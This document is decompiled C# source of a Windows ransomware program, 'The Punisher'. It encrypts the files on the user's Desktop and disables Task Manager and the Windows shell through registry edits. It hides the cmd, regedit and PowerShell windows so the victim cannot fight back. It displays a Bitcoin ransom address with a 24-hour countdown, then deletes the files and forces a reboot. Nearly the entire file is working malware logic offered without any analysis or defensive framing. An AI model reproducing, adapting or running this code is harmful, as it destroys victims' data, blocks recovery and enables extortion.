using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Permissions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ransomware;

public class ransomware : Form
{
	private Thread timer;

	private Thread cleaner;

	private List<string> targets = GetTargets();

	private const int SW_HIDE = 0;

	private const int SW_SHOW = 5;

	private IContainer components;

	private TextBox txtbox_password;

	private Button btn_decrypt;

	private PictureBox ransomware_icon;

	private Label label_decrypt;

	private Label label_timer;

	private Label var_timer;

	private Label label_countfiles;

	private Label var_countfiles;

	private Label label_title;

	private Label label_description;

	private TextBox txtbox_addr;

	private Button btn_copyaddr;

	private Timer tmr_hide;

	private Timer tmr_encrypt;

	private Timer tmr_clock;

	private Timer tmr_if;

	private Timer tmr_show;

	[DllImport("User32")]
	private static extern int ShowWindow(int hwnd, int nCmdShow);

	public ransomware()
	{
		InitializeComponent();
		Control.set_CheckForIllegalCrossThreadCalls(false);
		((Form)this).set_Opacity(0.0);
	}

	private void btn_decrypt_Click(object sender, EventArgs e)
	{
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		if (CryptoKit.ValidatePassword(((Control)txtbox_password).get_Text()))
		{
			CloseThreads();
			MessageBox.Show("Valid password", "UNLOCKED", (MessageBoxButtons)0, (MessageBoxIcon)64);
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("DisableTaskMgr", "", RegistryValueKind.String);
			Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon").SetValue("Shell", "explorer.exe", RegistryValueKind.String);
			MessageBox.Show(Withdraw(targets) + " files have been decrypted.");
			Process[] processesByName = Process.GetProcessesByName("ransomware");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
		}
		else
		{
			MessageBox.Show("Unvalid password", "WRONG PASSWORD", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	public static List<string> GetTargets()
	{
		List<string> list = new List<string>();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		list.AddRange(GetListFiles(folderPath));
		return list;
	}

	private void TimerInterval(int hours)
	{
		for (int num = hours * 60 * 60 - 1; num >= 0; num--)
		{
			((Control)var_timer).set_Text(TimeSpan.FromSeconds(num).ToString());
			Thread.Sleep(1000);
		}
		foreach (string target in targets)
		{
			File.Delete(target);
		}
		Process.Start("shutdown", "/r /t 0");
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int num = Spread(targets);
		((Control)var_countfiles).set_Text(num.ToString());
		Thread.Sleep(3000);
		((Form)this).set_Opacity(1.0);
		int hours = 24;
		timer = new Thread((ThreadStart)delegate
		{
			TimerInterval(hours);
		});
		timer.Start();
		cleaner = new Thread((ThreadStart)delegate
		{
			HideProcessInterval();
		});
		cleaner.Start();
		Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
		Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop").SetValue("Wallpaper", "", RegistryValueKind.String);
		Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon").SetValue("Shell", "empty", RegistryValueKind.String);
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
		CloseThreads();
	}

	private void HideProcessInterval()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.ProcessName == "cmd")
				{
					ShowWindow(process.MainWindowHandle.ToInt32(), 0);
				}
				if (process.ProcessName == "regedit")
				{
					ShowWindow(process.MainWindowHandle.ToInt32(), 0);
				}
				if (process.ProcessName == "Processhacker")
				{
					ShowWindow(process.MainWindowHandle.ToInt32(), 0);
				}
				if (process.ProcessName == "sdclt")
				{
					ShowWindow(process.MainWindowHandle.ToInt32(), 0);
				}
				if (process.ProcessName == "powershell")
				{
					ShowWindow(process.MainWindowHandle.ToInt32(), 0);
				}
			}
			Thread.Sleep(200);
		}
	}

	private void CloseThreads()
	{
		if (timer != null)
		{
			timer.Abort();
		}
		if (cleaner != null)
		{
			cleaner.Abort();
		}
	}

	private static List<string> GetListStorageDrives()
	{
		string environmentVariable = Environment.GetEnvironmentVariable("WINDIR");
		DriveInfo[] drives = DriveInfo.GetDrives();
		List<string> list = new List<string>();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (!environmentVariable.Contains(driveInfo.ToString()))
			{
				list.Add(driveInfo.ToString());
			}
		}
		return list;
	}

	private static bool RemoveFileAttr(string filename)
	{
		try
		{
			FileAttributes fileAttributes = File.GetAttributes(filename);
			if ((fileAttributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				fileAttributes &= ~FileAttributes.Hidden;
				File.SetAttributes(filename, fileAttributes);
			}
			if ((fileAttributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				fileAttributes &= ~FileAttributes.Hidden;
				File.SetAttributes(filename, fileAttributes);
			}
		}
		catch (Exception)
		{
			return false;
		}
		return true;
	}

	private static List<string> GetListFiles(string rootDirectory)
	{
		IEnumerable<string> source = Traverse(rootDirectory);
		List<string> list = new List<string>();
		foreach (string item in source.ToList())
		{
			try
			{
				FileAttributes attributes = File.GetAttributes(item);
				if (!attributes.HasFlag(FileAttributes.Directory) && RemoveFileAttr(item))
				{
					list.Add(item);
				}
			}
			catch (Exception)
			{
			}
		}
		return list;
	}

	private static IEnumerable<string> Traverse(string rootDirectory)
	{
		IEnumerable<string> files = Enumerable.Empty<string>();
		IEnumerable<string> directories = Enumerable.Empty<string>();
		try
		{
			((CodeAccessPermission)new FileIOPermission((FileIOPermissionAccess)8, rootDirectory)).Demand();
			files = Directory.GetFiles(rootDirectory);
			directories = Directory.GetDirectories(rootDirectory);
		}
		catch
		{
			rootDirectory = null;
		}
		if (rootDirectory != null)
		{
			yield return rootDirectory;
		}
		foreach (string item in files)
		{
			yield return item;
		}
		IEnumerable<string> enumerable = directories.SelectMany(Traverse);
		foreach (string item2 in enumerable)
		{
			yield return item2;
		}
	}

	private void btn_copyaddr_Click(object sender, EventArgs e)
	{
		Clipboard.SetText(((Control)txtbox_addr).get_Text());
	}

	private static int Spread(List<string> files)
	{
		int num = 0;
		for (int i = 0; i < files.Count; i++)
		{
			if (CryptoKit.EncryptFile(files[i]))
			{
				num++;
			}
		}
		return num;
	}

	private static int Withdraw(List<string> files)
	{
		int num = 0;
		for (int i = 0; i < files.Count; i++)
		{
			if (CryptoKit.DecryptFile(files[i]))
			{
				num++;
			}
		}
		return num;
	}

	private void txtbox_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Invalid comparison between Unknown and I4
		if ((int)e.get_KeyCode() == 13)
		{
			btn_decrypt_Click(this, new EventArgs());
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Expected O, but got Unknown
		//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e3: Expected O, but got Unknown
		//IL_00ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f4: Expected O, but got Unknown
		//IL_0128: Unknown result type (might be due to invalid IL or missing references)
		//IL_0132: Expected O, but got Unknown
		//IL_018c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0196: Expected O, but got Unknown
		//IL_01a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b3: Expected O, but got Unknown
		//IL_0254: Unknown result type (might be due to invalid IL or missing references)
		//IL_025e: Expected O, but got Unknown
		//IL_02eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f5: Expected O, but got Unknown
		//IL_0381: Unknown result type (might be due to invalid IL or missing references)
		//IL_038b: Expected O, but got Unknown
		//IL_0412: Unknown result type (might be due to invalid IL or missing references)
		//IL_041c: Expected O, but got Unknown
		//IL_04a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b0: Expected O, but got Unknown
		//IL_053a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0544: Expected O, but got Unknown
		//IL_05cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d5: Expected O, but got Unknown
		//IL_065f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0669: Expected O, but got Unknown
		//IL_070c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0716: Expected O, but got Unknown
		//IL_09aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_09b4: Expected O, but got Unknown
		//IL_09d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_09e3: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(ransomware));
		txtbox_password = new TextBox();
		btn_decrypt = new Button();
		ransomware_icon = new PictureBox();
		label_decrypt = new Label();
		label_timer = new Label();
		var_timer = new Label();
		label_countfiles = new Label();
		var_countfiles = new Label();
		label_title = new Label();
		label_description = new Label();
		txtbox_addr = new TextBox();
		btn_copyaddr = new Button();
		tmr_hide = new Timer(components);
		tmr_encrypt = new Timer(components);
		tmr_clock = new Timer(components);
		tmr_if = new Timer(components);
		tmr_show = new Timer(components);
		((ISupportInitialize)ransomware_icon).BeginInit();
		((Control)this).SuspendLayout();
		((Control)txtbox_password).set_BackColor(Color.White);
		((Control)txtbox_password).set_Font(new Font("Microsoft Sans Serif", 10.8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)txtbox_password).set_Location(new Point(295, 404));
		((Control)txtbox_password).set_Name("txtbox_password");
		((Control)txtbox_password).set_Size(new Size(418, 28));
		((Control)txtbox_password).set_TabIndex(3);
		((Control)txtbox_password).add_KeyDown(new KeyEventHandler(txtbox_KeyDown));
		((Control)btn_decrypt).set_Font(new Font("Microsoft Sans Serif", 13.8f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_decrypt).set_Location(new Point(413, 438));
		((Control)btn_decrypt).set_Name("btn_decrypt");
		((Control)btn_decrypt).set_Size(new Size(214, 53));
		((Control)btn_decrypt).set_TabIndex(4);
		((Control)btn_decrypt).set_Text("Decrypt");
		((ButtonBase)btn_decrypt).set_UseVisualStyleBackColor(true);
		((Control)btn_decrypt).add_Click((EventHandler)btn_decrypt_Click);
		((Control)ransomware_icon).set_BackColor(Color.Transparent);
		ransomware_icon.set_Image((Image)componentResourceManager.GetObject("ransomware_icon.Image"));
		ransomware_icon.set_InitialImage((Image)null);
		((Control)ransomware_icon).set_Location(new Point(25, 38));
		((Control)ransomware_icon).set_Name("ransomware_icon");
		((Control)ransomware_icon).set_Size(new Size(222, 190));
		ransomware_icon.set_SizeMode((PictureBoxSizeMode)1);
		ransomware_icon.set_TabIndex(6);
		ransomware_icon.set_TabStop(false);
		((Control)label_decrypt).set_AutoSize(true);
		((Control)label_decrypt).set_Font(new Font("Microsoft Sans Serif", 14f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label_decrypt).set_ForeColor(Color.White);
		((Control)label_decrypt).set_Location(new Point(290, 368));
		((Control)label_decrypt).set_Name("label_decrypt");
		((Control)label_decrypt).set_Size(new Size(393, 29));
		((Control)label_decrypt).set_TabIndex(7);
		((Control)label_decrypt).set_Text("Enter the valid password to decrypt:");
		((Control)label_timer).set_AutoSize(true);
		((Control)label_timer).set_Font(new Font("Microsoft Sans Serif", 14f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label_timer).set_ForeColor(Color.White);
		((Control)label_timer).set_Location(new Point(37, 368));
		((Control)label_timer).set_Name("label_timer");
		((Control)label_timer).set_Size(new Size(113, 29));
		((Control)label_timer).set_TabIndex(9);
		((Control)label_timer).set_Text("Time left:");
		((Control)var_timer).set_AutoSize(true);
		((Control)var_timer).set_Font(new Font("Microsoft Sans Serif", 20f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)var_timer).set_ForeColor(Color.White);
		((Control)var_timer).set_Location(new Point(35, 404));
		((Control)var_timer).set_Name("var_timer");
		((Control)var_timer).set_Size(new Size(149, 39));
		((Control)var_timer).set_TabIndex(10);
		((Control)var_timer).set_Text("00:00:00");
		((Control)label_countfiles).set_AutoSize(true);
		((Control)label_countfiles).set_Font(new Font("Microsoft Sans Serif", 14f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label_countfiles).set_ForeColor(Color.White);
		((Control)label_countfiles).set_Location(new Point(37, 256));
		((Control)label_countfiles).set_Name("label_countfiles");
		((Control)label_countfiles).set_Size(new Size(154, 29));
		((Control)label_countfiles).set_TabIndex(11);
		((Control)label_countfiles).set_Text("Infected files:");
		((Control)var_countfiles).set_AutoSize(true);
		((Control)var_countfiles).set_Font(new Font("Microsoft Sans Serif", 20f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)var_countfiles).set_ForeColor(Color.White);
		((Control)var_countfiles).set_Location(new Point(35, 296));
		((Control)var_countfiles).set_Name("var_countfiles");
		((Control)var_countfiles).set_Size(new Size(36, 39));
		((Control)var_countfiles).set_TabIndex(12);
		((Control)var_countfiles).set_Text("0");
		((Control)label_title).set_AutoSize(true);
		((Control)label_title).set_Font(new Font("Microsoft Sans Serif", 14f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_title).set_ForeColor(Color.White);
		((Control)label_title).set_Location(new Point(290, 38));
		((Control)label_title).set_Name("label_title");
		((Control)label_title).set_Size(new Size(411, 29));
		((Control)label_title).set_TabIndex(13);
		((Control)label_title).set_Text("RANSOMWARE - THE PUNISHER");
		((Control)label_description).set_AutoSize(true);
		((Control)label_description).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_description).set_ForeColor(Color.White);
		((Control)label_description).set_Location(new Point(302, 95));
		((Control)label_description).set_Name("label_description");
		((Control)label_description).set_Size(new Size(386, 200));
		((Control)label_description).set_TabIndex(14);
		((Control)label_description).set_Text(componentResourceManager.GetString("label_description.Text"));
		label_description.set_TextAlign((ContentAlignment)2);
		((Control)txtbox_addr).set_BackColor(Color.White);
		((Control)txtbox_addr).set_Font(new Font("Microsoft Sans Serif", 10.8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)txtbox_addr).set_Location(new Point(295, 307));
		((Control)txtbox_addr).set_Name("txtbox_addr");
		((TextBoxBase)txtbox_addr).set_ReadOnly(true);
		((Control)txtbox_addr).set_Size(new Size(418, 28));
		((Control)txtbox_addr).set_TabIndex(15);
		((Control)txtbox_addr).set_Text("1FNuqQpSxpdYoqus2cFPSqFSz8qQikxVNm");
		((Control)btn_copyaddr).set_Location(new Point(719, 307));
		((Control)btn_copyaddr).set_Name("btn_copyaddr");
		((Control)btn_copyaddr).set_Size(new Size(54, 28));
		((Control)btn_copyaddr).set_TabIndex(16);
		((Control)btn_copyaddr).set_Text("Copy");
		((ButtonBase)btn_copyaddr).set_TextAlign((ContentAlignment)2);
		((ButtonBase)btn_copyaddr).set_UseVisualStyleBackColor(true);
		((Control)btn_copyaddr).add_Click((EventHandler)btn_copyaddr_Click);
		tmr_hide.set_Enabled(true);
		tmr_hide.set_Interval(5000);
		tmr_encrypt.set_Enabled(true);
		tmr_encrypt.set_Interval(1000);
		tmr_clock.set_Enabled(true);
		tmr_clock.set_Interval(600000);
		tmr_if.set_Enabled(true);
		tmr_if.set_Interval(300);
		tmr_show.set_Enabled(true);
		tmr_show.set_Interval(1000);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.DarkRed);
		((Form)this).set_ClientSize(new Size(794, 526));
		((Control)this).get_Controls().Add((Control)(object)btn_copyaddr);
		((Control)this).get_Controls().Add((Control)(object)txtbox_addr);
		((Control)this).get_Controls().Add((Control)(object)label_description);
		((Control)this).get_Controls().Add((Control)(object)label_title);
		((Control)this).get_Controls().Add((Control)(object)var_countfiles);
		((Control)this).get_Controls().Add((Control)(object)label_countfiles);
		((Control)this).get_Controls().Add((Control)(object)var_timer);
		((Control)this).get_Controls().Add((Control)(object)label_timer);
		((Control)this).get_Controls().Add((Control)(object)label_decrypt);
		((Control)this).get_Controls().Add((Control)(object)ransomware_icon);
		((Control)this).get_Controls().Add((Control)(object)btn_decrypt);
		((Control)this).get_Controls().Add((Control)(object)txtbox_password);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("ransomware");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Ransomware");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)ransomware_icon).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
